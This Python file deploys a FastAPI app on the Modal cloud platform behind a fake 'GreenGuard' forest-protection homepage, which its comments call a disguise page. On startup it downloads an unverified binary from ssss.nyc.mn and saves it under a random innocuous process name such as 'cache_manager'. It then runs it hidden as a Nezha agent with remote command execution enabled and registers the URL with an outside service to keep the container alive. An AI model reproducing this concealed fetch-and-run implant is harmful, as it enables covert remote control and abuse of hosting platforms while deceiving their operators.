import os
import json
import time
import subprocess
import platform
import random
import threading
from fastapi import FastAPI, Response, Request
from fastapi.responses import HTMLResponse
import modal

# ========== Modal 配置 ==========
DEPLOY_REGION = os.environ.get('DEPLOY_REGION', 'us-east')  # 从环境变量读取，默认美国东部

# ========== Modal 镜像定义 ==========
image = modal.Image.debian_slim().pip_install(
    "fastapi==0.115.12",
    "pydantic==2.11.7",
    "requests",
    "psutil",
    "uvicorn",
)

app = modal.App("app", image=image)

# ========== FastAPI 实例 ==========
web_app = FastAPI(
    title="Cloud Services Platform",
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)

# ========== 全局启动控制 ==========
_agent_started = False
_agent_lock = threading.Lock()
_keepalive_started = False
_keepalive_lock = threading.Lock()
_project_url = None

# ========== 伪装页面 HTML ==========
FAKE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GreenGuard | Protect Our Forests</title>
    <style>
        /* General Styles */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            line-height: 1.6;
            color: #333;
            background-color: #f4f9f4;
        }

        /* Navigation */
        nav {
            background: #1a4314;
            color: #fff;
            padding: 1rem 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        nav .logo {
            font-size: 1.5rem;
            font-weight: bold;
            letter-spacing: 1px;
        }

        /* Hero Section */
        header {
            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), 
                        url('https://images.unsplash.com/photo-1441974231531-c6227db76b6e?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
            background-size: cover;
            background-position: center;
            height: 80vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            padding: 0 20px;
        }

        header h1 {
            font-size: 3.5rem;
            margin-bottom: 10px;
        }

        header p {
            font-size: 1.2rem;
            max-width: 600px;
        }

        .btn {
            background: #2e7d32;
            color: white;
            padding: 12px 30px;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 20px;
            transition: background 0.3s;
        }

        .btn:hover {
            background: #1b5e20;
        }

        /* Content Sections */
        .container {
            width: 80%;
            margin: auto;
            overflow: hidden;
            padding: 4rem 0;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }

        .card {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
        }

        .card h3 {
            color: #2e7d32;
        }

        /* Call to Action Section */
        .cta {
            background: #e8f5e9;
            text-align: center;
            padding: 4rem 20px;
        }

        /* Footer */
        footer {
            background: #1a4314;
            color: white;
            text-align: center;
            padding: 2rem 0;
        }

        /* Mobile Responsive */
        @media (max-width: 768px) {
            header h1 { font-size: 2.5rem; }
            .container { width: 90%; }
        }
    </style>
</head>
<body>

    <nav>
        <div class="logo">🌲 GREENGUARD</div>
        <div>
            <small>Protecting the Lungs of the Earth</small>
        </div>
    </nav>

    <header>
        <h1>Stop Deforestation</h1>
        <p>Every tree cut down is a breath lost. Join our mission to end illegal logging and restore the world's green heart.</p>
        <a href="#act" class="btn">Take Action Now</a>
    </header>

    <div class="container">
        <h2 style="text-align: center; margin-bottom: 3rem;">Why It Matters</h2>
        <div class="grid">
            <div class="card">
                <h3>Biodiversity</h3>
                <p>Forests are home to over 80% of terrestrial species. When we destroy forests, we destroy homes.</p>
            </div>
            <div class="card">
                <h3>Climate Control</h3>
                <p>Trees absorb CO2. Massive logging accelerates global warming and disrupts weather patterns.</p>
            </div>
            <div class="card">
                <h3>Clean Air & Water</h3>
                <p>Forests act as natural filters for our air and stabilize water cycles for millions of people.</p>
            </div>
        </div>
    </div>

    <section class="cta" id="act">
        <h2>How Can You Help?</h2>
        <p>Small changes lead to big impacts. Here is how you can say "No" to logging today:</p>
        <ul style="list-style: none; padding: 0; font-weight: 500;">
            <li>✅ Use recycled paper and wood products.</li>
            <li>✅ Support brands with "FSC Certified" labels.</li>
            <li>✅ Donate to reforestation projects.</li>
            <li>✅ Spread awareness on social media.</li>
        </ul>
        <a href="mailto:info@greenguard.org" class="btn">Get Involved</a>
    </section>

    <footer>
        <p>&copy; 2026 GreenGuard Initiative. All rights reserved.</p>
        <p>Built with ❤️ for the Planet.</p>
    </footer>

</body>
</html>"""

# ========== 辅助函数（来自成功代码，确保全部保留）==========

def create_directory(file_path):
    if not os.path.exists(file_path):
        os.makedirs(file_path, exist_ok=True)
        print(f"Directory created: {file_path}")

def get_system_architecture():
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    return 'amd'

def download_file(file_name, file_url, file_path):
    import requests
    try:
        full_path = os.path.join(file_path, file_name)
        print(f"Downloading {file_url} -> {full_path}")
        response = requests.get(file_url, stream=True, timeout=60)
        response.raise_for_status()
        with open(full_path, 'wb') as f:
            total = 0
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                total += len(chunk)
        print(f"Download complete: {total} bytes written to {full_path}")
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

def authorize_files(file_path):
    if os.path.exists(file_path):
        try:
            os.chmod(file_path, 0o775)
            print(f"Permissions set for {file_path}")
        except Exception as e:
            print(f"Chmod failed for {file_path}: {e}")
    else:
        print(f"File not found for chmod: {file_path}")

def write_log(message):
    try:
        with open('/tmp/agent.log', 'a') as f:
            f.write(f"[{time.ctime()}] {message}\n")
    except Exception:
        pass

def exec_cmd(command):
    try:
        write_log(f"Executing: {command}")
        with open('/tmp/agent.log', 'a') as f:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=f,
                stderr=f,
                start_new_session=True,
            )
        write_log(f"Process started with PID: {process.pid}")
        return process.pid
    except Exception as e:
        write_log(f"Command execution failed: {e}")
        print(f"Command execution failed: {e}")
        return None

def run_agent(file_path, nezha_server, nezha_port, nezha_key, uuid):
    if not nezha_server or not nezha_key:
        msg = "NEZHA_SERVER or NEZHA_KEY is missing, agent will not start."
        print(msg)
        write_log(msg)
        return

    architecture = get_system_architecture()
    print(f"Detected architecture: {architecture}")
    write_log(f"Architecture: {architecture}")

    disguise_names = [
        'cache_manager',
        'session_handler',
        'task_worker',
        'log_rotator',
        'health_check',
    ]
    disguise_name = random.choice(disguise_names)
    print(f"Using disguise name: {disguise_name}")
    write_log(f"Disguise name: {disguise_name}")

    if nezha_port:
        if architecture == 'arm':
            url = "https://arm64.ssss.nyc.mn/agent"
        else:
            url = "https://amd64.ssss.nyc.mn/agent"
    else:
        if architecture == 'arm':
            url = "https://arm64.ssss.nyc.mn/v1"
        else:
            url = "https://amd64.ssss.nyc.mn/v1"

    print(f"Download URL: {url}")
    write_log(f"Download URL: {url}")

    if not download_file(disguise_name, url, file_path):
        msg = "Download failed, agent not started."
        print(msg)
        write_log(msg)
        return

    agent_path = os.path.join(file_path, disguise_name)
    authorize_files(agent_path)

    if os.path.exists(agent_path):
        file_size = os.path.getsize(agent_path)
        print(f"Agent file size: {file_size} bytes")
        write_log(f"Agent file size: {file_size} bytes")
        if file_size < 1000:
            msg = "Agent file too small, possibly corrupted."
            print(msg)
            write_log(msg)
            return
    else:
        msg = "Agent file does not exist after download."
        print(msg)
        write_log(msg)
        return

    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']

    if nezha_port:
        nezha_tls_flag = '--tls' if nezha_port in tls_ports else ''
        command = (
            f"nohup {agent_path} "
            f"-s {nezha_server}:{nezha_port} "
            f"-p {nezha_key} "
            f"{nezha_tls_flag} "
            f">/dev/null 2>&1 &"
        )
    else:
        port = ""
        if ":" in nezha_server:
            port = nezha_server.split(":")[-1]
        nezha_tls = "true" if port in tls_ports else "false"

        config_yaml = (
            f"client_secret: {nezha_key}\n"
            f"debug: false\n"
            f"disable_auto_update: true\n"
            f"disable_command_execute: false\n"
            f"disable_force_update: true\n"
            f"disable_nat: false\n"
            f"disable_send_query: false\n"
            f"gpu: false\n"
            f"insecure_tls: false\n"
            f"ip_report_period: 1800\n"
            f"report_delay: 4\n"
            f"server: {nezha_server}\n"
            f"skip_connection_count: false\n"
            f"skip_procs_count: false\n"
            f"temperature: false\n"
            f"tls: {nezha_tls}\n"
            f"use_gitee_to_upgrade: false\n"
            f"use_ipv6_country_code: false\n"
            f"uuid: {uuid}\n"
        )

        config_path = os.path.join(file_path, 'config.yaml')
        with open(config_path, 'w') as f:
            f.write(config_yaml)
        print(f"Config written to {config_path}")
        write_log(f"Config written to {config_path}")

        command = (
            f"nohup {agent_path} "
            f"-c \"{config_path}\" "
            f">/dev/null 2>&1 &"
        )

    print(f"Starting agent: {command}")
    write_log(f"Starting agent: {command}")
    pid = exec_cmd(command)
    if pid:
        print(f"Agent process launched, PID: {pid}")
        write_log(f"Agent process launched, PID: {pid}")
    else:
        print("Failed to launch agent process.")
        write_log("Failed to launch agent process.")

def tail_log(filepath, lines=10):
    try:
        with open(filepath, 'r') as f:
            all_lines = f.read().splitlines()
            return all_lines[-lines:] if len(all_lines) >= lines else all_lines
    except FileNotFoundError:
        return ["Log file not found"]
    except Exception as e:
        return [f"Error reading log: {str(e)}"]

def find_agent_processes():
    import psutil
    agent_names = [
        'cache_manager',
        'session_handler',
        'task_worker',
        'log_rotator',
        'health_check',
    ]
    found = []
    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
        try:
            cmdline = ' '.join(proc.info.get('cmdline') or [])
            name = proc.info.get('name', '')
            if any(n in cmdline or n in name for n in agent_names):
                found.append({
                    "pid": proc.info['pid'],
                    "name": proc.info.get('name', 'unknown'),
                    "status": proc.info.get('status', 'unknown'),
                })
        except Exception:
            continue
    return found

# ========== 自动保活功能 ==========

def get_project_url():
    global _project_url
    if _project_url:
        return _project_url
    return os.environ.get('PROJECT_URL', '')

def auto_detect_url(request: Request):
    global _project_url
    if _project_url:
        return

    scheme = request.headers.get('x-forwarded-proto', 'https')
    host = request.headers.get('host', '')

    if host:
        detected = f"{scheme}://{host}"
        _project_url = detected
        msg = f"Auto-detected PROJECT_URL: {_project_url}"
        print(msg)
        write_log(msg)
        start_keepalive()

def add_visit_task(project_url):
    import requests
    try:
        response = requests.post(
            'https://trans.ct8.pl/add-url',
            json={"url": project_url},
            headers={'Content-Type': 'application/json'},
            timeout=30,
        )
        response.raise_for_status()
        msg = f"Automatic access task added successfully for {project_url}"
        print(msg)
        write_log(msg)
        return True
    except Exception as e:
        msg = f"Add automatic access task failed: {e}"
        print(msg)
        write_log(msg)
        return False

def self_keepalive_loop(project_url, interval=120):
    import requests
    health_url = project_url.rstrip('/') + '/health'
    while True:
        try:
            time.sleep(interval + random.randint(0, 30))
            response = requests.get(health_url, timeout=30)
            msg = f"Self keepalive ping: {health_url} -> {response.status_code}"
            print(msg)
            write_log(msg)
        except Exception as e:
            msg = f"Self keepalive ping failed: {e}"
            print(msg)
            write_log(msg)

def start_keepalive():
    global _keepalive_started
    with _keepalive_lock:
        if _keepalive_started:
            return
        _keepalive_started = True

    project_url = get_project_url()
    if not project_url:
        msg = "PROJECT_URL is empty, keepalive will not start yet."
        print(msg)
        write_log(msg)
        with _keepalive_lock:
            _keepalive_started = False
        return

    auto_access = os.environ.get('AUTO_ACCESS', 'true').lower()
    keepalive_interval = int(os.environ.get('KEEPALIVE_INTERVAL', '120'))

    print(f"Starting keepalive for: {project_url}")
    write_log(f"Starting keepalive for: {project_url}")

    if auto_access in ('true', '1', 'yes'):
        task_thread = threading.Thread(
            target=add_visit_task,
            args=(project_url,),
            daemon=True,
        )
        task_thread.start()
        print("External keepalive task submitted to trans.ct8.pl")
        write_log("External keepalive task submitted to trans.ct8.pl")

    keepalive_thread = threading.Thread(
        target=self_keepalive_loop,
        args=(project_url, keepalive_interval),
        daemon=True,
    )
    keepalive_thread.start()
    print(f"Self keepalive loop started (interval: ~{keepalive_interval}s)")
    write_log(f"Self keepalive loop started (interval: ~{keepalive_interval}s)")

def ensure_agent_started():
    global _agent_started
    with _agent_lock:
        if _agent_started:
            print("Agent already started, skipping.")
            return
        _agent_started = True

    print("=" * 50)
    print("Initializing Nezha Agent...")
    print("=" * 50)

    FILE_PATH = os.environ.get('FILE_PATH', '.cache')
    NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')
    NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
    NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
    UUID = os.environ.get('UUID', '')

    print(f"FILE_PATH:      {FILE_PATH}")
    print(f"NEZHA_SERVER:   {NEZHA_SERVER}")
    print(f"NEZHA_PORT:     {NEZHA_PORT}")
    print(f"NEZHA_KEY:      {'***' + NEZHA_KEY[-4:] if len(NEZHA_KEY) > 4 else '(empty)'}")
    print(f"UUID:           {UUID}")

    write_log("=" * 40)
    write_log("Agent initialization started")
    write_log(f"FILE_PATH: {FILE_PATH}")
    write_log(f"NEZHA_SERVER: {NEZHA_SERVER}")
    write_log(f"NEZHA_PORT: {NEZHA_PORT}")
    write_log(f"UUID: {UUID}")

    create_directory(FILE_PATH)

    def agent_starter():
        try:
            run_agent(FILE_PATH, NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, UUID)
        except Exception as e:
            msg = f"Agent starter thread exception: {e}"
            print(msg)
            write_log(msg)

    thread = threading.Thread(target=agent_starter, daemon=True)
    thread.start()
    print("Agent starter thread launched.")

# ========== FastAPI 中间件 ==========
@web_app.middleware("http")
async def detect_url_middleware(request: Request, call_next):
    auto_detect_url(request)
    response = await call_next(request)
    return response

# ========== FastAPI 启动事件 ==========
@web_app.on_event("startup")
async def startup_event():
    print("FastAPI startup event fired.")
    print(f"Deploy Region: {DEPLOY_REGION} (from environment)")
    ensure_agent_started()   # 现在已定义

# ========== FastAPI 路由 ==========
@web_app.get("/")
async def root():
    return HTMLResponse(content=FAKE_HTML)

@web_app.get("/health")
async def health():
    data = {
        "status": "healthy",
        "timestamp": time.time(),
        "uptime": time.ctime(),
    }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/status")
async def status():
    processes = find_agent_processes()
    if processes:
        data = {
            "agent_status": "running",
            "processes": processes,
            "process_count": len(processes),
        }
    else:
        data = {
            "agent_status": "not_running",
            "processes": [],
            "process_count": 0,
            "recent_logs": tail_log('/tmp/agent.log', lines=5),
        }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/logs")
async def logs():
    log_lines = tail_log('/tmp/agent.log', lines=30)
    data = {
        "log_lines": len(log_lines),
        "logs": log_lines,
    }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/info")
async def info():
    import psutil
    data = {
        "platform": platform.platform(),
        "architecture": platform.machine(),
        "python_version": platform.python_version(),
        "deploy_region": DEPLOY_REGION,
        "cpu_count": psutil.cpu_count(),
        "memory_total_mb": round(psutil.virtual_memory().total / 1024 / 1024, 2),
        "memory_used_mb": round(psutil.virtual_memory().used / 1024 / 1024, 2),
        "memory_percent": psutil.virtual_memory().percent,
        "disk_total_gb": round(psutil.disk_usage('/').total / 1024 / 1024 / 1024, 2),
        "disk_used_gb": round(psutil.disk_usage('/').used / 1024 / 1024 / 1024, 2),
        "disk_percent": psutil.disk_usage('/').percent,
        "pid": os.getpid(),
        "cwd": os.getcwd(),
    }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/keepalive")
async def keepalive_status():
    project_url = get_project_url()
    data = {
        "keepalive_started": _keepalive_started,
        "project_url": project_url or "not detected yet",
        "auto_detected": bool(_project_url),
        "auto_access": os.environ.get('AUTO_ACCESS', 'true'),
        "keepalive_interval": int(os.environ.get('KEEPALIVE_INTERVAL', '120')),
        "recent_logs": [
            line for line in tail_log('/tmp/agent.log', lines=20)
            if 'keepalive' in line.lower() or 'automatic access' in line.lower()
            or 'auto-detected' in line.lower()
        ],
    }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/restart")
async def restart_agent():
    import psutil
    global _agent_started
    killed = []
    processes = find_agent_processes()
    for proc_info in processes:
        try:
            proc = psutil.Process(proc_info['pid'])
            proc.kill()
            killed.append(proc_info['pid'])
        except Exception:
            pass
    with _agent_lock:
        _agent_started = False
    time.sleep(2)
    ensure_agent_started()
    data = {
        "action": "restart",
        "killed_pids": killed,
        "message": "Agent restart initiated",
    }
    return Response(content=json.dumps(data), media_type="application/json")

# ========== Modal 入口（正确指定区域）==========
# 从环境变量读取用户选择的区域，并指定为部署区域
selected_region = os.environ.get('DEPLOY_REGION', 'us-east')  # 读取用户选择，默认美国东部

@app.function(
    secrets=[modal.Secret.from_name("nezha-secrets")],
    scaledown_window=300,
    region=[selected_region],
)
@modal.concurrent(max_inputs=10)
@modal.asgi_app()
def fastapi_app():
    return web_app
